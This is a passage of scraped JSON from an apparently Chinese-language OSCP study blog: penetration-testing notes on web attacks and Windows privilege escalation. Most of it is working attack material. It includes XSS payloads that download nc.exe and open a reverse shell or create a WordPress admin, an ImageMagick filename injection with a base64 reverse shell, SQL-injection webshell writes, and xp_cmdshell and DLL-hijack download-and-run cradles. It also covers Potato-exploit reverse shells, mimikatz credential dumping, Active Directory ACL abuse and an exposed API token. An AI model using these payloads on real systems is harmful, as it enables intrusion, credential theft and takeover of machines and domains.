LgAxADYALgA5AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABz ADEAKQAKAA==`?\u0026gt; id_rsa中使用默认 RSA 算法，它也可以是id_rsa或id_ecdsa。 值得一看的文件包含\nhttps://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/untitled SSI注入 \u0026lt;!--#exec cmd=\u0026#34;id\u0026#34; --\u0026gt; \u0026lt;!--#EXEC cmd=\u0026#34;cat /etc/passwd\u0026#34; --\u0026gt; ICMP监听 sudo tcpdump -nni tun0 icmp XSS beef 安装： apt-get install beef-xss 伪造请求： 案例1：\n\u0026lt;script src=\u0026#34;http://10.10.16.5/1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 开启服务器 var request = new XMLHttpRequest(); var params = \u0026#39;cmd=dir|powershell -c \u0026#34;iwr -uri 10.10.16.5/nc.exe -outfile %temp%\\\\n.exe\u0026#34;; %temp%\\\\n.exe -e cmd.exe 10.10.16.5 443\u0026#39;; request.open(\u0026#39;POST\u0026#39;, \u0026#39;http://localhost/admin/backdoorchecker.php\u0026#39;, true); request.setRequestHeader(\u0026#39;Content-type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;); request.send(params); 案例2：\nvar ajaxRequest = new XMLHttpRequest(); var requestURL = \u0026#34;/wp-admin/user-new.php\u0026#34;; var nonceRegex = /ser\u0026#34; value=\u0026#34;([^\u0026#34;]*?)\u0026#34;/g; ajaxRequest.open(\u0026#34;GET\u0026#34;, requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; var params = \u0026#34;action=createuser\u0026amp;_wpnonce_create-user=\u0026#34;+nonce+\u0026#34;\u0026amp;user_login=attacker\u0026amp;email=attacker@offsec.com\u0026amp;pass1=attackerpass\u0026amp;pass2=attackerpass\u0026amp;role=administrator\u0026#34;; ajaxRequest = new XMLHttpRequest(); ajaxRequest.open(\u0026#34;POST\u0026#34;, requestURL, true); ajaxRequest.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); ajaxRequest.send(params); JS压缩：\nhttps://jscompress.com/\nJS编码：\nfunction encode_to_javascript(string) { var input = string var output = \u0026#39;\u0026#39;; for(pos = 0; pos \u0026lt; input.length; pos++) { output += input.charCodeAt(pos); if(pos != (input.length - 1)) { output += \u0026#34;,\u0026#34;; } } return output; } let encoded = encode_to_javascript(\u0026#39;XXXXXXXSSSSSS\u0026#39;) console.log(encoded) 编码后使用：\ncurl -i http://offsecwp --user-agent \u0026#34;\u0026lt;script\u0026gt;eval(String.fromCharCode(xxxxx))\u0026lt;/script\u0026gt;\u0026#34; wordpress 思路： 首先是wpscan扫描，重点在于插件名字和版本号，配合searchsploit查找漏洞。 随后是用户扫描，做字典进行爆破+社工字典（可选）\n然后是漏洞利用，未授权的rce最好 其次sql注入，读取admin账户密码，可爆破的 然后是文件读取，读数据账密 /var/www/wp-config.php /var/www/html/wp-config.php /var/www/html/main/wp-config.php /var/www/html/wordpress/wp-config.php ssh密钥，通过passwd文件可以知道用户名字 /home/daniela/.ssh/id_rsa\nwpscan API: 885u9XNOZWZ2KUhUKOVstFAyUaJ0CSh5x9ZXv5r2UXQ 扫描所有插件： wpscan --url http://offsecwp -e ap --api-token 885u9XNOZWZ2KUhUKOVstFAyUaJ0CSh5x9ZXv5r2UXQ 扫描漏洞插件：(不准确) -e vp 爆破用户名： wpscan --url http://offsecwp -P xxx -U xxx 激进扫描，在常规扫描无果的情况下： --plugins-detection aggressive 扫描用户： wpscan --url http://offsecwp -e u getshell themes路径 http://192.168.5.101/wordpress/wp-content/themes/twentyfourteen/404.php 文件上传： 上传到： ../../../../../../../root/.ssh/authorized_keys ImageMagick： cp 1.jpeg \u0026#39;|smile\u0026#34;`echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjEyLzQ0NDQgMD4mMScK | base64 -d | bash`\u0026#34;.jpg .htaccess \u0026lt;FilesMatch \u0026#34;shana\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 上传文件名： shana.jpg 在有身份信息的情况下可以考虑：\ncadaver tool cadaver http://192.168.142.122 命令执行 判断执行环境： (dir 2\u0026gt;\u0026amp;1 *`|echo CMD);\u0026amp;\u0026lt;# rem #\u0026gt;echo PowerShell 在Windows系统下的 cmd命令中，有以下一些截断拼接符。 \u0026amp;前面的语句为假则直接执行后面的 \u0026amp;\u0026amp;前面的语句为假则直接出错，后面的也不执行 |直接执行后面的语句 ||前面出错执行后面的 在Linux系统下的shell命令中，有以下一些截断拼接符。 在Linux上，上面的;也可以用|、||代替 ;前面的执行完执行后面的 | 管道符，上一条命令的输出，作为下一条命令的参数 ||当前面的执行出错时执行后面的 \u0026amp; 无论前边语句真假都会执行 \u0026amp;\u0026amp; 只有前边语句为真，才会执行后边语句 在linux中可以使用`whoami`的方式执行命令 ","permalink":"https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/","summary":"\u003cp\u003e靶场的关注重点相比实战会更为细节：\u003c/p\u003e\n\u003cp\u003e1、域名；\n2、网站技术架构cms等；\n3、目录；\n4、弱口令或者默认口令，弱密码不多，但是需要组合，注意用户名大小写，密码名字复用\n5、敏感组合拳信息；\n6、web漏洞；\u003c/p\u003e\n\u003ch1 id=\"fuzz\"\u003eFUZZ\u003c/h1\u003e\n\u003cp\u003ehost域名碰撞\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003effuf -u \u0026#34;http://flight.htb\u0026#34; -H \u0026#34;Host: FUZZ.flight.htb\u0026#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"wfuzz\"\u003eWFUZZ:\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id --hw=0(看说明)\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"子域名爆破\"\u003e子域名爆破\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H \u0026#34;Host: FUZZ.streetfighterclub.htb\u0026#34; --hw 717   \n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"目录扫描\"\u003e目录扫描：\u003c/h2\u003e\n\u003cp\u003e正常扫描，如果没有东西，又没有其他入口，考虑加大字典、换工具、以及二级目录，各种状态码都有值得一看的必要：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.5.104/ -x php,aspx,jsp,html,js\n\ngobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.63/ -m HEAD -t 100 --no-error -x php,aspx,jsp,html,js\n\ndirsearch -u  http://192.168.154.129/ \n\n漏洞字典：\n/usr/share/wordlists/dirb/vulns/sharepoint.txt\n\n\noscp优化：\ndirsearch -u http://192.168.192.141/ --wordlists=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt \n\n这个效果一般\ngobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.141/ -x php,txt -x php,js,html -m HEAD -t 50\n\n最后版本：\ngobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.225.153:8000/partner/ -t 1000 --no-error -b 404,503\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"http爆破\"\u003ehttp爆破：\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e表单：\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \u0026#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid\u0026#34; -t 64\n\nhydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form \u0026#34;/index.php:fm_usr=user\u0026amp;fm_pwd=^PASS^:Login failed. Invalid\u0026#34;\n\n\n摘要认证：\nhydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"sql注入\"\u003esql注入：\u003c/h1\u003e\n\u003ch2 id=\"mysql\"\u003emysql\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e连接：\nmysql -h10.0.0.1 -uroot -p123\nmysql -u school -p\u0026#39;@jCma4s8ZM\u0026lt;?kA\u0026#39; -h localhost\n\n基础语法：\n查库名：\nunion select group_concat(database())#\n查表名：\nunion select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;library\u0026#39;#\n查列名：\nunion select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;access\u0026#39; #\n查数据：\nunion select group_concat(\u0026#39;\\n\u0026#39;,id,\u0026#39;\\n\u0026#39;,service,\u0026#39;\\n\u0026#39;,username,\u0026#39;\\n\u0026#39;,password) from access #\n写入：\n1\u0026#34;UNION SELECT 1,2,\u0026#34;\u0026lt;?php system($_REQUEST[\u0026#39;a\u0026#39;]);?\u0026gt;\u0026#34; into outfile \u0026#39;C:/inetpub/wwwroot/cxk5.php\u0026#39;#\n\n手动测试流程：\n判断是否有注入：\n1\u0026#39;-- -\n1\u0026#34;-- -\n\u0026#39; or 1=1 -- -\n判断列数：\n-1\u0026#39; order by 1-- -\n-1\u0026#39; union select 1,2,3,4,5-- -\n\nmysql爆数据：\ngroup_concat(schema_name) from information_schema.schemata --+  查询库名\ngroup_concat(table_name) from information_schema.tables where table_schema=\u0026#39;webapphacking\u0026#39; --+  查询表名\ngroup_concat(column_name) from information_schema.columns where table_name=\u0026#39;表名\u0026#39; --+ 查询列名\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"mssql\"\u003emssql\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emssql爆数据：\nhttps://www.cnblogs.com/-meditation-/articles/16112699.html\nhttps://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet\n值得注意的知识点：\nsysobjects：记录了数据库中所有表，常用字段为id、name和xtype。\nsyscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。\n\n如果你想在当前数据库上下文中查询名为 Hub_DB的数据库中的表名，你可以使用 Hub_DB..sysobjects 的语法来引用 Hub_DB 数据库中的系统表 sysobjects。这样的查询将会返回 Hub_DB 数据库中所有对象的信息，包括表、视图、存储过程等。\nHub_DB..syscolumns同理\n\n表名很多参考id值，爆表名时记得把ID也爆出来\n\n关键词：Warning\nQuery\n\n普通盲注：\n\u0026#39; AND IF (1=1, sleep(3),\u0026#39;false\u0026#39;) --\n\u0026#39; OR NOT 1251=1251#\n\u0026#39; AND IF (1=1, sleep(3),\u0026#39;false\u0026#39;) -- \n\n简化xp_cmd:\n一条：\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;,1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;,1;RECONFIGURE;\n二条\nEXEC master.dbo.xp_cmdshell \u0026#39;ping 192.168.45.240\u0026#39;;\n\n盲注开启xp_cmd:\n\ncurl members.streetfighterclub.htb/old/verify.asp -d \n\n\u0026#34;username=test\u0026amp;password=test\u0026amp;logintype=64738;EXEC+sp_configure+\u0026#39;show+advanced+options\u0026#39;,1;EXEC+sp_configure+\u0026#39;Xp_cmdshell\u0026#39;,1;RECONFIGURE;+--\u0026#39;;\u0026amp;B1=LogIn\u0026#34;\n\n关闭xp_cmd:\ncurl members.streetfighterclub.htb/old/verify.asp -d \u0026#34;username=test\u0026amp;password=test\u0026amp;logintype=64738;EXEC+sp_configure+\u0026#39;show+advanced+options\u0026#39;,1;EXEC+sp_configure+\u0026#39;Xp_cmdshell\u0026#39;,0;RECONFIGURE;+--\u0026#39;;\u0026amp;B1=LogIn\u0026#34;\n\n验证：\nsudo tcpdump -nni tun0 icmp\nusername=a\u0026amp;password=a\u0026amp;logintype=1;EXEC+Xp_cmdshell+\u0026#39;ping+10.10.16.5\u0026#39;;\u0026amp;B1=LogIn\n\n反弹shell:\nEXEC master.dbo.xp_cmdshell \u0026#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.175/nishang.ps1\u0026#39;)\u0026#34;;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003exp_cmd命令执行16进制编码，不一定成功\u003c/p\u003e","title":"web渗透"},{"content":"提权检查项目：注意细心！！！！！！！！！！一切异常情况\n目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator\n1、计划任务，配合手动可以查看下次运行时间 2、服务，查看是否具备重启服务或者自动运行重启计算机的权限 3、DLL劫持去看软件目录日志吧 4、不可相信命令查看的软件列表，需要手动慢慢看 5、注意WINPEASS的输出，可能存在明文的密码 6、内核提权不多，重点在于特权提权 7、一些特殊的软件或者目录，keepass2\\putty\\\n信息收集 start /b 程序 后台运行 cmd /k start 后台运行 查看管理员用户组：\n本地 net localgroup administrators 获取所有组 net localgroup Get-LocalGroup 用户添加：\nnet group site_admin awallace /add /domain 进阶操作： net user cxk cxk123! /add /domain 添加用户进域 net group 组名 用户名 /add 添加用户到组 net localgroup \u0026#34;Remote Management Users\u0026#34; cxk /add 添加到远程管理组 查看当前用户所属组：\nwhoami /groups 通过注册表查看已经安装了的软件：\n64位： Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname 32位： Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname 通过目录查看安装软件情况：\nC:\\Program Files (x86) C:\\Program Files \\AppData\\Roaming\\ C:\\Users\\cxk\\AppData\\Roaming 正在运行的进程：\nGet-Process 辅助脚本 PEASSL: https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9 Seatbelt： https://github.com/GhostPack/Seatbelt https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file 服务提权 查找服务，并过滤不处于运行中的服务，注意非用户安装的，就是非常规**C:\\Windows\\System32**下面的： Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like \u0026#39;Running\u0026#39;} \u0026gt; 2.txt 权限表： MASK\tPERMISSIONS F\tFull access M\tModify access RX\tRead and execute access R\tRead-only access W\tWrite-only access 查看服务启动模式： Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like \u0026#39;mysql\u0026#39;} Restart-Service xxx Stop-Service xxx 查找服务提权的Ps脚本 1、https://github.com/itm4n/PrivescCheck.git http远程调用： powershell -nop -exec bypass -c \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.16.9/PrivescCheck.ps1\u0026#39;);Invoke-PrivescCheck\u0026#34; 2、https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 使用方法： powershell -ep bypass . .\\PowerUp.ps1 Get-ModifiableServiceFile 微软官方，powershell管理服务的方法： https://learn.microsoft.com/zh-cn/powershell/scripting/samples/managing-services?view=powershell-7.4#stopping-starting-suspending-and-restarting-services DLL劫持(需要RDP） 下载软件： https://learn.microsoft.com/en-us/sysinternals/downloads/procmon\ndll.cpp\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; BOOL APIENTRY DllMain( HANDLE hModule,// Handle to DLL module DWORD ul_reason_for_call,// Reason for calling function LPVOID lpReserved ) // Reserved { switch ( ul_reason_for_call ) { case DLL_PROCESS_ATTACH: // A process is loading the DLL. int i; i = system (\u0026#34;powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.240/nishang.ps1\u0026#39;)\u0026#34;); break; case DLL_THREAD_ATTACH: // A process is creating a new thread. break; case DLL_THREAD_DETACH: // A thread exits normally. break; case DLL_PROCESS_DETACH: // A process unloads the DLL. break; } return TRUE; } 编译：\nx86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll 路径，以下目录皆可：\n$env:path 服务路径提权 查找，首先找到非常规目录的服务： Get-CimInstance -ClassName win32_service | Select Name,State,PathName 或者： wmic service get name,pathname | findstr /i /v \u0026#34;C:\\Windows\\\\\u0026#34; | findstr /i /v \u0026#34;\u0026#34;\u0026#34; 如果显示程序占用可以使用move: move bd.exe original.exe 然后确认是否具备重启服务，或者服务自动启动+重启机器的权限 Restart-Service GammaService net stop mysql 重启机器，如果没有权限修改服务的情况下： 必须拥有SeShutDownPrivilege权限： shutdown /r /t 0 随后确认路径是否具备写入权限： icacls \u0026#34;C:\\Program Files\u0026#34; 随后写入，然后重新启动 Restart-Service GammaService 值得注意的是，软件名字为带空格的目录的第一个单词， 举例： C:\\Program Files\\Enterprise Apps\\Current.exe C:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe 小技巧： 可以使用正则表达式： .*\\bsvchost\\b.* .*\u0026#34;.* 计划任务提权 Scheduled Applications\n查看计划任务： schtasks /query /fo LIST /v 查看目录权限： icacls C:\\Users\\steve\\Pictures\\BackendCacheCleanup.exe 提权WIKI https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9 这里面也有域内的漏洞： https://github.com/SecWiki/windows-kernel-exploits 特权提权 https://github.com/gtworek/Priv2Admin SeManageVolume 运行即可获取C盘所有读写权限，利用DLL劫持，systeminfo即可提权\nhttps://github.com/CsEnox/SeManageVolumeExploit/ SeImpersonatePrivilege提权 土豆家族：\nhttps://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%8F%90%E6%9D%83/JuicyPotato.md\n总结 如果机器 \u0026gt;= Windows 10 1809 \u0026amp; Windows Server 2019 试试Rogue Potato 如果机器 \u0026lt; Windows 10 1809 \u0026lt; Windows Server 2019 试试Juicy Potato\n神薯 https://github.com/BeichenDream/GodPotato/releases/tag/V1.20\nRoguePotato\n资料 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato github https://github.com/antonioCoco/RoguePotato?tab=readme-ov-file juicypotato可以从服务账户提权，服务账户的权限也需要进行检查 kali: sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999 nc -lvvp 4444 windows: RoguePotato.exe -r 192.168.45.194 -e \u0026#34;c:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 192.168.45.194 4444\u0026#34; -l 9999 查找CLSID https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/ RoguePotato.exe -r 192.168.45.185 -c \u0026#34;{6d8ff8df-730d-11d4-bf42-00b0d0118b56}\u0026#34; -e \u0026#34;c:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\nc.exe -e cmd.exe 192.168.45.185 4444\u0026#34; -l 9999 roguepotato-and-printspoofer\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer SweetPotato\u0026amp;printspoofer\nSeImpersonatePrivilege 权限才行 https://github.com/uknowsec/SweetPotato?tab=readme-ov-file SweetPotato.exe -a whoami wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe .\\PrintSpoofer64.exe -i -c powershell.exe https://github.com/uknowsec/JuicyPotato 推荐这个，webshell版本\nJuicyPotato_x32.exe -l 1337 -c \u0026#34;{4991d34b-80a1-4291-83b6-3328366b9097}\u0026#34; -p c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -a \u0026#34;-e cmd 192.168.45.184 4445\u0026#34; 常用内核提权 https://github.com/abatchy17/WindowsExploits https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools 常见漏洞 \u0026lt;1\u0026gt; 远程漏洞 ms03-026 ms03-039 (1) ms03-039 (2) ms03-049 ms04-007 ms04-011 - ssl bof ms04-011 - lsasarv.dll ms04-031 ms05-017 ms05-039 ms06-040 (1) ms06-040 (2) ms06-070 ms08-067 (1) ms08-067 (2) ms08-067 (3) ms09-050 \u0026lt;2\u0026gt; 本地漏洞 ms04-011 ms04-019 (1) ms04-019 (2) ms04-019 (3) ms04-020 keybd_event ms05-018 ms05-055 ms06-030 ms06-049 print spool service ms08-025 netdde ms10-015 ms10-059 ms10-092 ms11-080 ms14-040 ms14-058 (1) ms14-058 (2) ms14-070 (1) ms14-070 (2) ms15-010 (1) ms15-010 (2) **ms15-051** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools ms16-014 ms16-016 **ms16-032** https://github.com/zcgonvh/MS16-032/releases/tag/Release meterpreter 在整个学习期间，其实是尽量在减少对meterpreter的使用的，这里只记录一些常见的使用：\n迁移进程： getpid 查看当前pid ps 寻找可迁移的pid migrate \u0026lt;目标PID\u0026gt; 查看远程活动窗口\u0026amp;截图\nqwinsta /server:127.0.0.1 powershell 查看本地用户 Get-LocalUser UnauthorizedAccess问题：\n查看权限： Get-ExecutionPolicy -Scope CurrentUser 更改： Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser 使用账号密码切换用户：\n方法一： $passwd = ConvertTo-SecureString \u0026#34;l33th4x0rhector\u0026#34; -AsPlainText -force $cred = New-Object System.Management.Automation.PSCredential (\u0026#34;hector\u0026#34;, $passwd) Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {(Get-Acl -Path .\\keepmeon).Access | Where-Object { $_.IdentityReference -eq $env:USERNAME } \u0026#34;c:\\Program Files\\keepmeon\u0026#34;} -credential $cred 方法二： $password = convertto-securestring -AsPlainText -Force -String \u0026#34;l33th4x0rhector\u0026#34; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \u0026#34;CONTROL\\hector\u0026#34;,$password # testing Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential $passwd = ConvertTo-SecureString \u0026#34;W3_4R3_th3_f0rce.\u0026#34; -AsPlainText -force $cred = New-Object System.Management.Automation.PSCredential (\u0026#34;acute\\imonks\u0026#34;, $passwd) Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred pwoershell 修改文件内容：\n((Get-Content \u0026#34;c:\\users\\imonks\\Desktop\\wm.ps1\u0026#34; -Raw) -replace \u0026#39;Get-Volume\u0026#39;,\u0026#39;cmd.exe /c c:\\utils\\cxk2.exe\u0026#39;) | set-content -path c:\\users\\imonks\\Desktop\\wm.ps1 powershell历史记录位置\n$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 查看当前用户权限：\nwhoami /priv net user 用户名 powershell常用命令：\n获取系统信息： Get-WmiObject -Class Win32_OperatingSystem 导入脚本： import-module .\\脚本 查看菜单： menu 删除文件： Remove-Item -Path C:\\path\\to\\file.txt powershell身份切换，类似于su的实现： 执行whoami: $password = convertto-securestring -AsPlainText -Force -String \u0026#34;36mEAhz/B8xQ~2VM\u0026#34;; $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist \u0026#34;SNIPER\\chris\u0026#34;,$password; Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential; 反弹shell: 执行程序 Start-Process -FilePath c:\\users\\nico\\downloads\\SharpHound.exe powershell 绕过： C:\\WIndOWs\\sySwOw64\\WINdOwspOweRshEll\\v1.0\\poWersHeLl.Exe 查看隐藏文件： Get-ChildItem -Force 身份切换方式2： https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1 import-module ./Invoke-RunasCs.ps1 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \u0026#34;whoami\u0026#34; 列出文件树：\nGet-ChildItem -Recurse 文件查找：\nGet-ChildItem -Path C:\\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue windows本地提权 服务提权：\n1、创建服务： sc.exe config vss binPath=\u0026#34;C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.2 1234\u0026#34; 2、开启服务： sc.exe stop vss sc.exe start vss 权限赋予 授予权限： icacls C:\\path\\to\\your\\directory /grant username:(permissions) username: 要授予权限的用户名。 permissions: 要授予的权限。例如，F 表示完全控制，R 表示读取，W 表示写入等。可以使用多个字母组合，如 RW 表示读写权限。 域内提权注意权限： GenericAll: Full permissions on object GenericWrite: Edit certain attributes on the object WriteOwner: Change ownership of the object WriteDACL: Edit ACE\u0026#39;s applied to object AllExtendedRights: Change password, reset password, etc. ForceChangePassword: Password change for object Self (Self-Membership): Add ourselves to for example a group BACKUP OPERATORS组提权 推荐\nhttps://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/ 资料\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#f402 https://github.com/jakobfriedl/precompiled-binaries/tree/e6f7025e75dfc906d14e2fe33d0ebc6a321ece4a https://www.bordergate.co.uk/backup-operator-privilege-escalation/ 推荐\nhttps://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801 推荐\nhttps://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets GenericWrite权限 powerview Set-DomainObject -Identity maria -SET @{scriptpath=\u0026#34;C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\powercat.ps1\u0026#34;} WriteOwner 组权限 upload PowerView.ps1 Import-Module .\\PowerView.ps1 1。 设置为组所有者 Set-DomainObjectOwner -Identity \u0026#39;Domain Admins\u0026#39; -OwnerIdentity \u0026#39;maria\u0026#39; 2. 给自己授予全部权限 Add-DomainObjectAcl -TargetIdentity \u0026#34;Domain Admins\u0026#34; -PrincipalIdentity maria -Rights All 3. 把自己添加到dbadmin Add-DomainGroupMember -Identity \u0026#39;Domain Admins\u0026#39; -Members \u0026#39;maria\u0026#39; WriteOwner 用户权限 . .\\PowerView.ps1 //将PowerView导入 把当前用户tom设置为claire用户的 ACL 的所有者并授予其修改密码的权限 Set-DomainObjectOwner -Identity claire -OwnerIdentity tom Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose 设置claire的密码为Ab345678123!@# $cred = ConvertTo-SecureString \u0026#34;Ab345678123!@#\u0026#34; -AsPlainText -force Set-DomainUserPassword -identity claire -accountpassword $cred Genericall 权限 使用hash的方式修改密码，如果使用明文密码的话，取消最后面的--pw-nt-hash即可 net rpc password \u0026#34;Tristan.Davies\u0026#34; \u0026#34;newP@ssword2023\u0026#34; -U \u0026#34;search.htb\u0026#34;/\u0026#34;BIR-ADFS-GMSA$\u0026#34; -S \u0026#34;RESEARCH.search.htb\u0026#34; --pw-nt-hash mimikatz ```第一步，提升权限： privilege::debug token::elevate 以所有方式获取密码： sekurlsa::logonpasswords 以SAM获取密码： lsadump::sam 导出TGT： sekurlsa::tickets /export 查看TGT： dir *.kirbi 导入TGT，后面的是TGT文件名字： kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi ./mimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonpasswords\u0026#34; \u0026#34;exit\u0026#34; \u0026gt;mimikatz.txt ./mimikatz.exe \u0026#34;lsadump::sam /sam:c:\\windows.old\\Windows\\System32\\SAM /system:c:\\windows.old\\Windows\\System32\\SYSTEM\u0026#34; \u0026#34;exit\u0026#34; \u0026gt;\u0026gt; sam.txt ./mimikatz.exe \u0026#34;vault::list\u0026#34; \u0026#34;exit\u0026#34; \u0026gt;mimikatz.txt 更多使用方法：\nhttps://mp.weixin.qq.com/s/IDE2QEzVeuXk6liNeXhxpg powershell版本：\nhttps://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1 密码本和信息检索 git\n在软件目录中查找：\nGet-ChildItem -Path C:\\xampp -Include *.ini -File -Recurse -ErrorAction SilentlyContinue powershell \u0026#34;Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\u0026#34; 在用户目录下查找：\nGet-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.xml,*.log,*.kdbx,*.exe -File -Recurse -ErrorAction SilentlyContinue powershell历史记录：\n获取文件存储位置： (Get-PSReadlineOption).HistorySavePath 事件查看器： eventvwr.msc Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational: Click Filter Current Log and search for 4104 events flag隐藏： 备用数据流：\nC:\\Users\\Administrator\\Desktop\u0026gt;dir /R dir /R Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\\Users\\Administrator\\Desktop 11/08/2017 10:05 AM \u0026lt;DIR\u0026gt; . 11/08/2017 10:05 AM \u0026lt;DIR\u0026gt; .. 12/24/2017 03:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,440,134,656 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;powershell Get-Content -Path \u0026#34;hm.txt\u0026#34; -Stream \u0026#34;root.txt\u0026#34; powershell Get-Content -Path \u0026#34;hm.txt\u0026#34; -Stream 